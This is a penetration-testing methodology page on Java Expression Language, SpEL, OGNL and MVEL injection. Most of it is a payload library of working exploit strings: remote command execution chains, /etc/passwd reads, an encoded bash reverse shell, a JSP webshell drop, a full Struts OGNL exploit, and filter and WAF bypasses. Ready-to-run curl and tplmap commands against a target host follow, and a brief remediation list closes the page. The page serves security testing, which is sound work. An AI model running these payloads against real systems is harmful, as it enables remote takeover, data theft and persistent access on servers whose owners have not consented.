---
title: "Expression Language Injection (EL / SpEL)"
date: 2026-02-24
draft: false
---

# Expression Language Injection (EL / SpEL)

> **Severity**: Critical | **CWE**: CWE-917
> **OWASP**: A03:2021 – Injection

---

## What Is Expression Language Injection?

Expression Language (EL) is used in Java-based frameworks to bind data between UI and business logic. When user input is evaluated as an EL expression, the attacker gains access to the full Java runtime — leading to RCE. Two distinct attack surfaces:

**Java EL (JSP/JSF/Jakarta EE)**:
- Used in `${...}` and `#{...}` contexts in `.jsp`, `.jsf`, `.xhtml` files
- Evaluated server-side by the EL runtime (JUEL, Eclipse Mojarra, etc.)
- Access to `Runtime`, `ProcessBuilder`, class loading chain

**Spring SpEL (Spring Expression Language)**:
- Used in `@Value`, `@PreAuthorize`, `@PostFilter`, XML config, and any `ExpressionParser` call
- Evaluated via `StandardEvaluationContext` — full Java access unless sandboxed with `SimpleEvaluationContext`
- Common in Spring Data, Spring Security expressions, Spring Cloud Gateway, Spring Boot Actuator

```
Vulnerable pattern:
  String expr = "Hello " + userInput;        // JSP page expression
  ExpressionParser p = new SpelExpressionParser();
  p.parseExpression(expr).getValue(ctx);     // SpEL with user data
```

---

## Discovery Checklist

**Phase 1 — Fingerprint**
- [ ] Identify Java-based stack: JSP, JSF, Spring, Struts, Grails, Thymeleaf
- [ ] Find input reflected in output that might pass through EL: search fields, error messages, user profile display, URL parameters used in page templates
- [ ] Inject probe: `${7*7}` — if response shows `49` → EL executed
- [ ] Inject probe: `#{7*7}` — JSF deferred evaluation
- [ ] Inject `${1+1}` in: form fields, HTTP headers, cookies, JSON body, filenames
- [ ] Check error messages for EL-related stack traces (javax.el, org.springframework.expression)

**Phase 2 — Context Determination**
- [ ] Determine EL version: JUEL, Unified EL, SpEL, MVEL, OGNL (Struts), Pebble
- [ ] Test `${pageContext}` — JSP context available?
- [ ] Test `${request.getHeader('User-Agent')}` — HTTP context?
- [ ] Test `${applicationScope}` — app-wide context?
- [ ] Test `T(java.lang.Runtime)` — SpEL type reference?

**Phase 3 — Exploitation**
- [ ] Confirm OOB via DNS before attempting RCE
- [ ] Test all bypass techniques if input seems filtered
- [ ] Check for `SimpleEvaluationContext` restriction (blocks type references)
- [ ] Look for indirect SpEL sinks: Spring Cloud Gateway predicates/filters, Spring Security `@PreAuthorize` with user-controlled params

---

## Payload Library

### Payload 1 — Java EL Detection & Basic RCE

```java
// Detection probes — any reflection of the evaluated result confirms injection:
${7*7}                                    // → 49
#{7*7}                                    // JSF deferred → 49
${7*'7'}                                  // type coercion test → 49 or 7777777
${"".class.getName()}                     // → java.lang.String
${request.getClass().getName()}           // → reveals EL context class

// Read system property (no RCE, just info):
${System.getProperty('java.version')}
${System.getProperty('os.name')}
${System.getenv('PATH')}
${System.getProperty('user.dir')}

// Java EL RCE via Runtime:
${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

// Cleaner RCE — using ProcessBuilder:
${pageContext.setAttribute("x","".getClass().forName("java.lang.ProcessBuilder"))}
${pageContext.getAttribute("x").getDeclaredConstructors()[0].newInstance([["id"]]).start()}

// Read /etc/passwd:
${"".class.forName("java.util.Scanner").getDeclaredConstructors()[0].newInstance("".class.forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance([["cat","/etc/passwd"]]).start().getInputStream()).useDelimiter("\\A").next()}
```

### Payload 2 — Spring SpEL RCE

```java
// Standard SpEL RCE — T() type reference:
T(java.lang.Runtime).getRuntime().exec('id')
T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})
T(java.lang.ProcessBuilder).new(new String[]{'id'}).start()

// Read command output (ProcessBuilder + InputStream):
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()

// Reverse shell:
T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQUtFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}')

// Detect DNS OOB (no output needed):
T(java.net.InetAddress).getByName('COLLABORATOR_ID.oast.pro')
new java.net.URL('http://COLLABORATOR_ID.oast.pro/spel').openStream()

// File read:
new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\A').next()

// File write (drop webshell):
new java.io.FileOutputStream('/var/www/html/shell.jsp').write('<%=Runtime.getRuntime().exec(request.getParameter("c"))%>'.getBytes())

// System properties dump:
T(System).getProperties()
T(System).getenv()
```

### Payload 3 — SpEL Injection via HTTP Parameters

```bash
# Spring Cloud Gateway (CVE-class pattern — route predicate injection):
# Routes defined via Actuator API accept SpEL in certain filter configurations

# Test via /actuator/gateway/routes POST:
curl -s -X POST https://target.com/actuator/gateway/routes/test \
  -H "Content-Type: application/json" \
  -d '{
    "id": "test",
    "predicates": [{"name":"Path","args":{"_genkey_0":"/test"}}],
    "filters": [{
      "name": "AddRequestHeader",
      "args": {
        "name": "X-Test",
        "value": "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"
      }
    }],
    "uri": "https://target.com"
  }'

# Spring Data REST — projection SpEL injection:
# GET /api/users?projection=#{T(java.lang.Runtime).getRuntime().exec('id')}

# Spring Security @PreAuthorize with user-controlled params:
# @PreAuthorize("hasPermission(#entity, '" + userInput + "')")
# Inject: ' + T(java.lang.Runtime).getRuntime().exec('id') + '

# Thymeleaf template injection (different from SpEL but Java-based):
# __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
# ${__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('A').next()}__}
```

### Payload 4 — Bypass Techniques

```java
// === Bypass: filter blocks "Runtime" string ===

// String concatenation:
T(java.lang.Ru + ntime)      // won't work in SpEL, use concat:
T(java.lang.Class).forName("java.lang.Runt" + "ime").getRuntime().exec("id")

// Reflection via forName:
"".class.forName("java.lang.Runtime").getMethod("exec", "".class)
         .invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), "id")

// === Bypass: filter blocks T() operator ===
// Use reflection directly:
''.class.getSuperclass().forName('java.lang.Runtime').getRuntime().exec('id')

// Via classloader:
''.class.getClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('id')

// === Bypass: filter blocks "exec" ===
// getMethod by index position (index depends on JDK version — brute force):
"".class.forName("java.lang.Runtime").getMethods()[5].invoke(
  "".class.forName("java.lang.Runtime").getMethods()[6].invoke(null), "id")

// === Bypass: SimpleEvaluationContext (blocks T()) ===
// Requires a bean that exposes a dangerous method — check applicationContext:
@beanName.dangerousMethod(payload)
// Or: use constructor injection via #this if class has dangerous constructor

// === Bypass: WAF filters ${...} ===
// CRLF-split:
${\u007b7*7\u007d}     // unicode braces
%24%7b7*7%7d           // URL encode entire expression
%24%257b7*7%257d       // double encode

// Bypass via JSF deferred #{...}:
#{7*7}    // same EL engine, different syntax

// Bypass via nested expressions (EL within EL):
${'${7*7}'}   // outer evaluates inner as string — doesn't work
// Use attribute setting to chain:
${session.setAttribute("x","value")}${session.getAttribute("x")}
```

### Payload 5 — OGNL Injection (Apache Struts)

```java
// OGNL used in Struts 2 — if user input reaches OGNL evaluation:

// Basic detection:
%{7*7}
%{'test'.class.getName()}

// RCE via OGNL:
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#is=#process.getInputStream()).(#flushableWriter=new java.io.OutputStreamWriter(#ros)).(#pw=new java.io.PrintWriter(#flushableWriter)).(#pw.println(new java.util.Scanner(#is).useDelimiter('\\A').next())).(#pw.flush())}

// Short OGNL with #context:
%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Pwned","true")}

// Via Content-Type header injection (Struts file upload endpoint):
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}
```

### Payload 6 — MVEL / Seam Injection

```java
// MVEL (JBoss Seam, Drools):
// Detection:
@{7*7}
#{7*7}

// RCE:
@{Runtime.getRuntime().exec('id')}
#{Runtime.getRuntime().exec('id')}

// Read file:
@{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\A').next()}

// Seam framework — framework-specific EL context:
#{facesContext.externalContext.request.getSession(false).invalidate()}
#{facesContext.externalContext.redirect('http://attacker.com')}
```

---

## Tools

```bash
# tplmap — also covers EL injection:
git clone https://github.com/epinna/tplmap
python3 tplmap.py -u "https://target.com/search?q=*" \
  --engine EL --level 5

# Manual SpEL detection with curl:
curl -s "https://target.com/search?q=%24%7b7*7%7d"
curl -s "https://target.com/search?q=%23%7b7*7%7d"  # JSF

# Detect Spring:
curl -sI https://target.com/ | grep -i "x-powered-by\|server"
curl -s https://target.com/actuator/env 2>/dev/null | python3 -m json.tool | head -30

# Spring Boot Actuator — check for exposed endpoints:
for ep in env health info mappings beans routes; do
  curl -s "https://target.com/actuator/$ep" 2>/dev/null | head -3
done

# OOB DNS test for SpEL:
curl -s "https://target.com/api/filter?expr=T(java.net.InetAddress).getByName('COLLAB.oast.pro')"

# burp active scan covers SpEL — check "Server-Side Template Injection" issues

# Nuclei templates for EL/SpEL:
nuclei -u https://target.com -t exposures/configs/spring-actuator.yaml
nuclei -u https://target.com -t network/detect/spring-detection.yaml

# Find SpEL in source code:
grep -rn "parseExpression\|ExpressionParser\|SpelExpression\|EvaluationContext" \
  --include="*.java" src/ | grep -v "SimpleEvaluationContext"
# SimpleEvaluationContext is safe — StandardEvaluationContext with user input is not
```

---

## Remediation Reference

- **Never evaluate user input as EL/SpEL expression** — validate and encode before interpolation
- **SpEL**: use `SimpleEvaluationContext` instead of `StandardEvaluationContext` for user-facing expressions — blocks `T()` operator and reflection
- **Spring Cloud Gateway**: do not expose `/actuator/gateway` publicly; disable route modification via Actuator
- **Struts 2**: update to patched version, disable OGNL evaluation for all user-facing inputs, use `struts.enable.DynamicMethodInvocation=false`
- **Template engines**: use sandboxed rendering modes — never concatenate user input into template strings
- **Input validation**: reject `${`, `#{`, `%{`, `T(`, `@{` patterns at input boundary
- **WAF rules**: block EL expression syntax patterns as defense-in-depth

*Part of the Web Application Penetration Testing Methodology series.*
